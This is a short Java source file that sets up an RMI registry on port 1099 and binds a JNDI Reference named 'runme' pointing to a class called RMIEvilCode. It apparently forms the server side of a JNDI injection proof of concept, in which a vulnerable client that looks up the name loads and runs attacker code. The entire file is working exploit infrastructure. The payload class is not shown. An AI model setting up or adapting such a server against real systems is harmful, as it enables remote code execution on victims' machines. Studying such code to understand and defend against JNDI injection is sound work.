package com.xinyuz.rmi;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

@SuppressWarnings("restriction")
public class RMIServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            Reference        reference        = new Reference("com.xinyuz.rmi.RMIEvilCode", "com.xinyuz.rmi.RMIEvilCode", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("runme", referenceWrapper);
            
            System.out.println("Starting RMI server, waiting for the caller from ouside.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
